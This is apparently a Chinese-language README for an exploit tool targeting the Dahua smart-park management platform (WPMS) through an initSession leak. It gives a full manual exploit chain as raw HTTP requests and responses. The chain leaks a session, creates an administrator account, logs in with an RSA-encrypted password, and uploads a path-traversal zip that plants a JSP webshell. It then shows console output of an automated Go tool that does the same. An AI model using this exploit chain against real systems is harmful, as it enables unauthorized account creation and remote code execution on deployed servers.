# DaHuaWPMSinitSessionRCE
> 大华智慧园区综合管理平台initSession泄漏远程代码执行漏洞。

<!--
## 手动利用

1. 获取一个有效Session。

```http
GET /admin/sso_initSession.action HTTP/1.1
Host: example.com:8881
User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5620.223 Safari/537.36 Edg/111.0.1717.52
Accept-Encoding: gzip, deflate
Connection: close


```

```http
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Content-Type: application/json;charset=UTF-8
Date: Fri, 02 Jun 2023 05:34:30 GMT
Connection: close
Content-Length: 45

{"data":3,"errMsg":"success!","success":true}
```

2. 通过如上获取的session，去创建一个用户。

```http
POST /admin/user_save.action HTTP/1.1
Host: example.com:8881
User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5620.223 Safari/537.36 Edg/111.0.1717.52
Content-Length: 912
Content-Type: multipart/form-data; boundary=----bkjjfiez
Cookie: JSESSIONID=6FD24EF4487F9271013BAA92D0DA650C
Accept-Encoding: gzip, deflate
Connection: close

------bkjjfiez
Content-Disposition: form-data; name="userBean.userType"

0
------bkjjfiez
Content-Disposition: form-data; name="userBean.ownerCode"

001
------bkjjfiez
Content-Disposition: form-data; name="userBean.isReuse"

0
------bkjjfiez
Content-Disposition: form-data; name="userBean.macStat"

0
------bkjjfiez
Content-Disposition: form-data; name="userBean.roleIds"

1
------bkjjfiez
Content-Disposition: form-data; name="userBean.loginName"

mlgprwlw
------bkjjfiez
Content-Disposition: form-data; name="displayedOrgName"

mlgprwlw
------bkjjfiez
Content-Disposition: form-data; name="userBean.loginPass"

hzcregrq
------bkjjfiez
Content-Disposition: form-data; name="checkPass"

hzcregrq
------bkjjfiez
Content-Disposition: form-data; name="userBean.groupId"

0
------bkjjfiez
Content-Disposition: form-data; name="userBean.userName"

mlgprwlw
------bkjjfiez--
```

```http
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-Length: 0
Date: Wed, 31 May 2023 07:22:43 GMT
Connection: close


```

3. 获取一个publicKey。

```http
POST /WPMS/getPublicKey HTTP/1.1
Host: example.com:8881
User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5620.223 Safari/537.36 Edg/111.0.1717.52
Content-Length: 25
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close

{"loginName":"mlgprwlw"}

```

```http
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=46897D4411EFAFB6B4109C0DCE256911; Path=/WPMS; HttpOnly
Content-Type: application/json;charset=UTF-8
Content-Length: 395
Date: Wed, 31 May 2023 07:22:43 GMT
Connection: close

{"success":"true","loginName":null,"errMsg":null,"token":null,"id":null,"cmsIp":null,"cmsPort":null,"orgCode":null,"publicKey":"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCB0Nevz2M4E09udjE47HKo5COxvJ/dJVkqE6SVdYPrrx6vhNvMki3iqdIDMpYCWi/IfpBm+OYbJJwiZE9GHQde9Yt08HsSynl1U0/K/yHsKq21vw/UHLYcaCO+hwZG22E3yxyZya+/QrvnfOhS/SIFfaRut4ovkTiTtnt9oniOYwIDAQAB","nonce":"MjAyMy0wNS0zMSAxNToyMjo0NA\u003d\u003d"}
```

4. 通过如上publicKey对密码进行RSA加密，然后再进行登录，登录成功会获取一个token。

```javascript
getPublicKey: function() {
    var userName = "mlgprwlw";
    var password = "hzcregrq";
    var passwordEncode = "";
    var publicKey = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCB0Nevz2M4E09udjE47HKo5COxvJ/dJVkqE6SVdYPrrx6vhNvMki3iqdIDMpYCWi/IfpBm+OYbJJwiZE9GHQde9Yt08HsSynl1U0/K/yHsKq21vw/UHLYcaCO+hwZG22E3yxyZya+/QrvnfOhS/SIFfaRut4ovkTiTtnt9oniOYwIDAQAB";
    var encrypt = new JSEncrypt();
    encrypt.setPublicKey(publicKey);
    passwordEncode = encrypt.encrypt(password);
    console.log(passwordEncode);
}
```

```http
POST /WPMS/login HTTP/1.1
Host: example.com:8881
User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5620.223 Safari/537.36 Edg/111.0.1717.52
Content-Length: 271
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close

{"loginName":"mlgprwlw","loginPass":"UTvsxKml2I5jAOl+JntC4ZIrC/Qcc//7ttZoAQtRJmMt03e8UnbDF9XivYE1JjXQ8K8xSxbMIStnmzONR/DJTn1Lxrive1CEo3r9qTuhCZWd4P2774nTAcQiCfR7e9AEdj516CinpMERC3SMt/j/RabiHxAELdx98Z8Ha/YLMMI=","timestamp":"16853622671401904168273612873678126378126387"}

```

```http
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=0169686E96696D5D90C235F367235E5B; Path=/WPMS; HttpOnly
Content-Type: application/json;charset=UTF-8
Content-Length: 1043
Date: Wed, 31 May 2023 07:22:44 GMT
Connection: close

{"success":"true","loginName":"mlgprwlw","errMsg":null,"token":"15da311830ae2e333f1671db3859293e","id":"100118","cmsIp":"example.com","cmsPort":"9000","orgCode":"001","publicKey":"MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGBAIHQ16/PYzgTT252MTjscqjkI7G8n90lWSoTpJV1g+uvHq+E28ySLeKp0gMylgJaL8h+kGb45hsknCJkT0YdB171i3TwexLKeXVTT8r/IewqrbW/D9QcthxoI76HBkbbYTfLHJnJr79Cu+d86FL9IgV9pG63ii+ROJO2e32ieI5jAgMBAAECgYAndSMZ/R9bXAM4wBQWCUiQrUdsLrkorsF7WJ0eEKoYaRIap3dnpsbrrlJ3RljyPhdoCZA6vEy001vh2DuARDKI53LvSn1bIbm3//r14KuqF5vEPXiV/4RU+WTAd+TCY9C9talCWWz6ITrSscDKRBcbT/aCzbzkRNGunPaGnpcqgQJBAO/n5CEdFQVhjlKCT4yCvQdftLY6WBGDXlKq+Z7j5i/kxn7yhH0f5D6IfCT7EJurWJOq911UhxU73oGSykrBWP8CQQCKhkfY3m7fww+XfGREv4i/TABMhkZ6TqZCyhGlpqqVcbsIoXJpW5TsFFHj6TKw0POOp5fJP+nZrK00boPHMQadAkBqe9INRJxM/CUwyDhI1MrUWA2dCL6IX3fhV5ReiydjwLa+KCTYaOxlOS1pOKsBfYdeW/dZzKf8q8syVhZGIhW/AkBLWCov/RwVPQV4AcKP2hXI5s+qz8X5tFmeLkZW8UYLLubqFNYkFBn2Jj88VZSqs5wl1WYrokXRjahPwmSOrU3JAkBV+q2sb2AWa4t+FMewQiP3Zwk1Br+0hfhDaTyzublmJs7jrXjN1qcV+esP6+939PnPmj2aGYEjPE8WPUHBhSpN","nonce":null}
```

5. 通过如上请求得到的token，去请求基础应用页面。

```http
GET /admin/login_login.action?subSystemToken=15da311830ae2e333f1671db3859293e HTTP/1.1
Host: example.com:8881
User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5620.223 Safari/537.36 Edg/111.0.1717.52
Cookie: JSESSIONID=6FD24EF4487F9271013BAA92D0DA650C
Accept-Encoding: gzip, deflate
Connection: close


```

```http
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: currentToken=15da311830ae2e333f1671db3859293e; Expires=Mon, 18-Jun-2091 10:36:51 GMT; Path=/
Content-Type: text/html;charset=UTF-8
Date: Wed, 31 May 2023 07:22:44 GMT
Connection: close
Content-Length: 13384

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html>
	<head>
	<title>DSS</title>
	<script src="include/script/common.js?switchSkin=newBlue" type="text/javascript"></script>
	</head>
……
```

6. 上传恶意zip包，此处password参数值是`md5(username + ":dss:" + password)`。

```bash
$ echo -n 'mlgprwlw:dss:hzcregrq' | md5                                                               main ✔
1a8923d60146c3b0544c693495f9dcad
```

```http
POST /admin/recover_recover.action?password=1a8923d60146c3b0544c693495f9dcad HTTP/1.1
Host: example.com:8881
User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5620.223 Safari/537.36 Edg/111.0.1717.52
Content-Length: 560
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9c9BBHdk0NgAjoxz
Cookie: JSESSIONID=6FD24EF4487F9271013BAA92D0DA650C
Accept-Encoding: gzip, deflate
Connection: close

------WebKitFormBoundary9c9BBHdk0NgAjoxz
Content-Disposition: form-data; name="recoverFile"; filename="test1.zip"
Content-Type: application/zip

PK../../../../../../../../../../../../../opt/tomcat/webapps/upload/ismjjcth.jspP../../../../../../../../../../../../../opt/tomcat/webapps/upload/ismjjcth.jspPK
------WebKitFormBoundary9c9BBHdk0NgAjoxz-- 
```

```http
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-Length: 0
Date: Wed, 31 May 2023 07:22:44 GMT
Connection: close


```

7. 请求Webshell文件。

```http
GET /upload/ismjjcth.jsp HTTP/1.1
Host: example.com:8881
User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5620.223 Safari/537.36 Edg/111.0.1717.52
Accept-Encoding: gzip, deflate
Connection: close


```

```http
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=93E24E5195BE70B8F87C20A1864079CD; Path=/upload; HttpOnly
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 8
Date: Wed, 31 May 2023 07:22:44 GMT
Connection: close

enpjejok
```
-->

## 自动利用

检测任意用户创建漏洞。

```bash
$ go run main.go -p http://127.0.0.1:8080 -u http://example.com:8881

    ____        __  __                _       ______  __  ________
   / __ \____ _/ / / /_  ______ _    | |     / / __ \/  |/  / ___/
  / / / / __ '/ /_/ / / / / __ '/____| | /| / / /_/ / /|_/ /\__ \
 / /_/ / /_/ / __  / /_/ / /_/ /_____/ |/ |/ / ____/ /  / /___/ /
/_____/\__,_/_/ /_/\__,_/\__,_/      |__/|__/_/   /_/  /_//____/
    _       _ __  _____                _             ____  ____________
   (_)___  (_) /_/ ___/___  __________(_)___  ____  / __ \/ ____/ ____/
  / / __ \/ / __/\__ \/ _ \/ ___/ ___/ / __ \/ __ \/ /_/ / /   / __/
 / / / / / / /_ ___/ /  __(__  |__  ) / /_/ / / / / _, _/ /___/ /___
/_/_/ /_/_/\__//____/\___/____/____/_/\____/_/ /_/_/ |_|\____/_____/

[INFO] Target: http://example.com:8881
[INFO] Proxy: http://127.0.0.1:8080
[INFO] JSESSIONID: 4D23D1A593332723043CE44C98BEBF84
[INFO] Username/Password: h20di/tgq1cu69
```

Webshell文件上传利用。

```bash
$ go run main.go -p http://127.0.0.1:8080 -u http://example.com:8881 -f shell.jsp                       git:main*

    ____        __  __                _       ______  __  ________     
   / __ \____ _/ / / /_  ______ _    | |     / / __ \/  |/  / ___/     
  / / / / __ '/ /_/ / / / / __ '/____| | /| / / /_/ / /|_/ /\__ \      
 / /_/ / /_/ / __  / /_/ / /_/ /_____/ |/ |/ / ____/ /  / /___/ /      
/_____/\__,_/_/ /_/\__,_/\__,_/      |__/|__/_/   /_/  /_//____/       
    _       _ __  _____                _             ____  ____________
   (_)___  (_) /_/ ___/___  __________(_)___  ____  / __ \/ ____/ ____/
  / / __ \/ / __/\__ \/ _ \/ ___/ ___/ / __ \/ __ \/ /_/ / /   / __/   
 / / / / / / /_ ___/ /  __(__  |__  ) / /_/ / / / / _, _/ /___/ /___   
/_/_/ /_/_/\__//____/\___/____/____/_/\____/_/ /_/_/ |_|\____/_____/   
                                                                       
[INFO] Target: http://example.com:8881
[INFO] Proxy: http://127.0.0.1:8080
[INFO] JSESSIONID: 6BEDF380C75C6E0FD871119CBF1CF40C
[INFO] Username/Password: oqlmx/a9x3pcui
[INFO] Uploading Evil ZIP file...
[INFO] Webshell: http://example.com:8881/upload/sdad3d3o6.jsp
```